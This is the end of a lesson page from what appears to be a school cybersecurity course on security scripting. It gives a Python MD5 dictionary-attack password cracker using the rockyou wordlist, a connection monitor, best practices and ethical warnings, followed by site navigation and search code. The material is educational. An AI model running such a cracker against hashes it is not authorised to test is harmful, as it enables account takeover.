- Tools: Process Monitor, Wireshark, API monitors</p>
<h2 id="creating-security-tools">Creating Security Tools</h2>
<p>Let's build some useful tools:</p>
<p><strong>Password Cracker (Dictionary Attack):</strong></p>
<pre><code class="language-python">import hashlib

def crack_md5_hash(target_hash, wordlist_file):
    with open(wordlist_file, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            hash_attempt = hashlib.md5(password.encode()).hexdigest()

            if hash_attempt == target_hash:
                print(f&quot;Password found: {password}&quot;)
                return password

    print(&quot;Password not found in wordlist&quot;)
    return None

# Example usage
target = &quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;  # &quot;password&quot; in MD5
crack_md5_hash(target, &quot;rockyou.txt&quot;)
</code></pre>
<p><strong>Network Connection Monitor:</strong></p>
<pre><code class="language-python">import psutil
import time

def monitor_connections():
    known_connections = set()

    while True:
        connections = psutil.net_connections()

        for conn in connections:
            if conn.status == 'ESTABLISHED':
                conn_info = (conn.laddr.ip, conn.laddr.port, 
                           conn.raddr.ip if conn.raddr else None,
                           conn.raddr.port if conn.raddr else None)

                if conn_info not in known_connections:
                    print(f&quot;New connection: {conn_info}&quot;)
                    known_connections.add(conn_info)

        time.sleep(5)

monitor_connections()
</code></pre>
<h2 id="best-practices-for-security-scripting">Best Practices for Security Scripting</h2>
<ol>
<li><strong>Test in isolated environments</strong>: Don't run untested scripts on production systems</li>
<li><strong>Validate input</strong>: Always sanitize and validate user input</li>
<li><strong>Handle errors</strong>: Scripts should fail gracefully</li>
<li><strong>Log actions</strong>: Keep records of what your scripts do</li>
<li><strong>Comment code</strong>: Explain what your code does</li>
<li><strong>Use version control</strong>: Track changes with Git</li>
<li><strong>Follow responsible disclosure</strong>: Report vulnerabilities properly</li>
</ol>
<h2 id="ethical-considerations">Ethical Considerations</h2>
<p>You now have knowledge that could be used maliciously. Remember:</p>
<ul>
<li><strong>Never attack systems you don't own</strong> or have explicit permission to test</li>
<li><strong>Malware development</strong> for malicious purposes is illegal</li>
<li><strong>Responsible disclosure</strong> is the ethical path when finding vulnerabilities</li>
<li><strong>Consent is required</strong> for penetration testing</li>
<li><strong>Knowledge is not an excuse</strong> for illegal activity</li>
</ul>
<p>Many security professionals started by being curious and learning these skills. The difference between a security professional and a criminal is permission and intent.</p>
<h2 id="whats-next">What's Next</h2>
<p>In upcoming lessons, we'll:
- Dive deeper into network traffic analysis
- Learn to use professional security tools
- Study real-world attack scenarios
- Develop more sophisticated scripts
- Analyze actual malware samples</p>
<p>Scripting is a skill that improves with practice. Start small, build simple tools, and gradually increase complexity. Every security professional relies on scripting daily‚Äîit's what separates script kiddies from professionals.</p>
        

        <!-- Lesson Navigation (only show on non-homepage pages) -->
        
        <div class="lesson-nav">
            
            <a href="../../unit4/lesson4-2/" class="lesson-nav-button">
                <span class="arrow">‚Üê</span>
                <span>Previous: Lesson 4.2</span>
            </a>
            

            <div class="lesson-nav-info">
                <div class="current-lesson">Current Lesson</div>
                <div class="lesson-title">Lesson 5.1</div>
            </div>

            
            <a href="../lesson5-2/" class="lesson-nav-button">
                <span>Next: Lesson 5.2</span>
                <span class="arrow">‚Üí</span>
            </a>
            
        </div>
        
    </div>

    <footer>
        <p>NCHS Cybersecurity | Built with MkDocs</p>
        
        <p>Copyright &copy; 2025 Mohamed Morsy</p>
        
    </footer>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css" />
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    
    <script src="../../../search_index.js"></script>
    
    <script>
        function toggleMenu() {
            const navLinks = document.getElementById('navLinks');
            navLinks.classList.toggle('active');
        }

        document.addEventListener('DOMContentLoaded', function() {
            const unitHeaders = document.querySelectorAll('.nav-links .nested > strong');
            
            unitHeaders.forEach(header => {
                header.addEventListener('click', function(e) {
                    e.stopPropagation(); 
                    const parent = this.parentElement;
                    parent.classList.toggle('collapsed');
                });
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            const searchInput = document.getElementById('searchInput');
            const searchResults = document.getElementById('searchResults');
            
            if (!searchInput || !searchResults) {
                return;
            }
            
            let searchIndex = null;
            let useSimpleSearch = false;
            
            const simpleIndex = [
                
                    
                
                    
                        
                            
                                
                                {
                                    title: "Lesson 1.1",
                                    url: '../../unit1/lesson1-1/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.2",
                                    url: '../../unit1/lesson1-2/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.3",
                                    url: '../../unit1/lesson1-3/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.4",
                                    url: '../../unit1/lesson1-4/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.5",
                                    url: '../../unit1/lesson1-5/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Lesson 1.6",
                                    url: '../../unit1/lesson1-6/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                                {
                                    title: "Linux Installation Process",
                                    url: '../../unit1/installation-process/',
                                    path: 'Curriculum > Unit 1'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 2.1",
                                    url: '../../unit2/lesson2-1/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                                {
                                    title: "Lesson 2.2",
                                    url: '../../unit2/lesson2-2/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                                {
                                    title: "Lesson 2.3",
                                    url: '../../unit2/lesson2-3/',
                                    path: 'Curriculum > Unit 2'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 3.1",
                                    url: '../../unit3/lesson3-1/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                                {
                                    title: "Lesson 3.2",
                                    url: '../../unit3/lesson3-2/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                                {
                                    title: "Lesson 3.3",
                                    url: '../../unit3/lesson3-3/',
                                    path: 'Curriculum > Unit 3'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 4.1",
                                    url: '../../unit4/lesson4-1/',
                                    path: 'Curriculum > Unit 4'
                                },
                                
                                {
                                    title: "Lesson 4.2",
                                    url: '../../unit4/lesson4-2/',
                                    path: 'Curriculum > Unit 4'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 5.1",
                                    url: './',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                                {
                                    title: "Lesson 5.2",
                                    url: '../lesson5-2/',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                                {
                                    title: "Lesson 5.3",
                                    url: '../lesson5-3/',
                                    path: 'Curriculum > Unit 5'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 6.1",
                                    url: '../../unit6/lesson6-1/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                                {
                                    title: "Lesson 6.2",
                                    url: '../../unit6/lesson6-2/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                                {
                                    title: "Lesson 6.3",
                                    url: '../../unit6/lesson6-3/',
                                    path: 'Curriculum > Unit 6'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 7.1",
                                    url: '../../unit7/lesson7-1/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                                {
                                    title: "Lesson 7.2",
                                    url: '../../unit7/lesson7-2/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                                {
                                    title: "Lesson 7.3",
                                    url: '../../unit7/lesson7-3/',
                                    path: 'Curriculum > Unit 7'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 8.1",
                                    url: '../../unit8/lesson8-1/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                                {
                                    title: "Lesson 8.2",
                                    url: '../../unit8/lesson8-2/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                                {
                                    title: "Lesson 8.3",
                                    url: '../../unit8/lesson8-3/',
                                    path: 'Curriculum > Unit 8'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 9.1",
                                    url: '../../unit9/lesson9-1/',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                                {
                                    title: "Lesson 9.2",
                                    url: '../../unit9/lesson9-2/',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                                {
                                    title: "Lesson 9.3",
                                    url: '../../unit9/lesson9-3/',
                                    path: 'Curriculum > Unit 9'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 10.1",
                                    url: '../../unit10/lesson10-1/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                                {
                                    title: "Lesson 10.2",
                                    url: '../../unit10/lesson10-2/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                                {
                                    title: "Lesson 10.3",
                                    url: '../../unit10/lesson10-3/',
                                    path: 'Curriculum > Unit 10'
                                },
                                
                            
                        
                            
                                
                                {
                                    title: "Lesson 11.1",
                                    url: '../../unit11/lesson11-1/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                                {
                                    title: "Lesson 11.2",
                                    url: '../../unit11/lesson11-2/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                                {
                                    title: "Lesson 11.3",
                                    url: '../../unit11/lesson11-3/',
                                    path: 'Curriculum > Unit 11'
                                },
                                
                            
                        
                    
                
                    
                        {
                            title: "Terminal",
                            url: '../../../test/',
                            path: 'Main'
                        },
                    
                
            ];
            
            if (typeof window.searchIndex !== 'undefined') {
                searchIndex = window.searchIndex;
                useSimpleSearch = false;
                console.log('‚úì Using embedded search index:', searchIndex.docs.length, 'documents');
            } else {
                const base_url = document.querySelector('base')?.getAttribute('href') || '/';
                fetch(base_url + 'search_data.js')
                    .then(response => response.text())
                    .then(data => {
                        eval(data);  
                        if (window.searchIndex) {
                            searchIndex = window.searchIndex;
                            useSimpleSearch = false;
                            console.log('‚úì Loaded search index from JS:', searchIndex.docs.length, 'documents');
                        }
                    })
                    .catch(() => {
                        console.log('Using simple title search (full search not available)');
                        useSimpleSearch = true;
                    });
                
                useSimpleSearch = true; 
            }
            
            function performSearch(query) {
                if (!query || query.length < 2) {
                    searchResults.classList.remove('active');
                    return;
                }
                
                if (useSimpleSearch || !searchIndex) {
                    performSimpleSearch(query);
                } else {
                    performFullSearch(query);
                }
            }
            
            function performSimpleSearch(query) {
                const lowerQuery = query.toLowerCase();
                const results = simpleIndex.filter(item => 
                    item.title.toLowerCase().includes(lowerQuery)
                );
                displaySimpleResults(results, query);
            }
            
            function performFullSearch(query) {
                const lowerQuery = query.toLowerCase();
                const queryTerms = lowerQuery.split(/\s+/);
                
                const results = searchIndex.docs
                    .map(doc => {
                        let score = 0;
                        let matchedText = '';
                        
                        if (doc.title && doc.title.toLowerCase().includes(lowerQuery)) {
                            score += 10;
                        }
                        
                        if (doc.text) {
                            const text = doc.text.toLowerCase();
                            queryTerms.forEach(term => {
                                if (term.length < 2) return;
                                const count = (text.match(new RegExp(escapeRegex(term), 'g')) || []).length;
                                score += count;
                                
                                if (count > 0 && !matchedText) {
                                    const index = text.indexOf(term);
                                    const start = Math.max(0, index - 50);
                                    const end = Math.min(text.length, index + term.length + 50);
                                    matchedText = doc.text.substring(start, end);
                                    if (start > 0) matchedText = '...' + matchedText;
                                    if (end < text.length) matchedText = matchedText + '...';
                                }
                            });
                        }
                        
                        return {
                            title: doc.title,
                            location: doc.location,
                            text: matchedText || (doc.text ? doc.text.substring(0, 150) + '...' : ''),
                            score: score
                        };
                    })
                    .filter(result => result.score > 0)
                    .sort((a, b) => b.score - a.score);
                
                displayFullResults(results, query);
            }
            
            function displaySimpleResults(results, query) {
                if (results.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
                    searchResults.classList.add('active');
                    return;
                }
                
                const html = results.slice(0, 10).map(result => {
                    const highlightedTitle = highlightText(result.title, query);
                    return `
                        <a href="${result.url}" class="search-result-item">
                            <div class="search-result-title">${highlightedTitle}</div>
                            <div class="search-result-path">${escapeHtml(result.path)}</div>
                        </a>
                    `;
                }).join('');
                
                searchResults.innerHTML = html;
                searchResults.classList.add('active');
            }
            
            function displayFullResults(results, query) {
                if (results.length === 0) {
                    searchResults.innerHTML = '<div class="search-no-results">No results found</div>';
                    searchResults.classList.add('active');
                    return;
                }
                
                const pathname = window.location.pathname;
                let basePath = '/';
                
                const pathParts = pathname.split('/').filter(p => p);
                
                if (pathParts.length > 0 && !pathParts[0].endsWith('.html')) {
                    const firstPart = pathParts[0];
                    if (firstPart !== 'index' && firstPart !== 'search') {
                        basePath = '/' + firstPart + '/';
                    }
                }
                
                console.log('Current pathname:', pathname);
                console.log('Detected base path:', basePath);
                
                const html = results.slice(0, 10).map(result => {
                    const highlightedTitle = highlightText(result.title, query);
                    const highlightedText = highlightText(result.text, query);
                    
                    let path = result.location.replace(/^\//, '').replace(/\.html$/, '').replace(/\//g, ' > ');
                    if (!path) path = 'Home';
                    
                    let url;
                    if (basePath === '/') {
                        url = result.location;
                    } else {
                        const cleanLocation = result.location.startsWith('/') ? result.location.substring(1) : result.location;
                        url = basePath + cleanLocation;
                    }
                    
                    console.log('Result:', result.title, '-> URL:', url);
                    
                    return `
                        <a href="${url}" class="search-result-item">
                            <div class="search-result-title">${highlightedTitle}</div>
                            <div class="search-result-path">${escapeHtml(path)}</div>
                            <div class="search-result-excerpt">${highlightedText}</div>
                        </a>
                    `;
                }).join('');
                
                searchResults.innerHTML = html;
                searchResults.classList.add('active');
            }
            
            function highlightText(text, query) {
                if (!text) return '';
                const queryTerms = query.split(/\s+/).filter(t => t.length >= 2);
                let result = escapeHtml(text);
                queryTerms.forEach(term => {
                    const regex = new RegExp('(' + escapeRegex(term) + ')', 'gi');
                    result = result.replace(regex, '<span class="search-highlight">$1</span>');
                });
                return result;
            }
            
            function escapeRegex(string) {
                return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            }
            
            function escapeHtml(text) {
                const div = document.createElement('div');
                div.textContent = text;
                return div.innerHTML;
            }
            
            let searchTimeout;
            searchInput.addEventListener('input', function(e) {
                clearTimeout(searchTimeout);
                searchTimeout = setTimeout(() => performSearch(e.target.value), 300);
            });
            
            searchInput.addEventListener('focus', function(e) {
                if (e.target.value.length >= 2) {
                    performSearch(e.target.value);
                }
            });
            
            document.addEventListener('click', function(e) {
                if (!searchInput.contains(e.target) && !searchResults.contains(e.target)) {
                    searchResults.classList.remove('active');
                }
            });
            
            searchInput.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    searchResults.classList.remove('active');
                    searchInput.blur();
                }
            });
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('pre code').forEach((block) => {
                block.parentElement.style.position = 'relative';
            });
        });
        
    </script>
</body>
</html>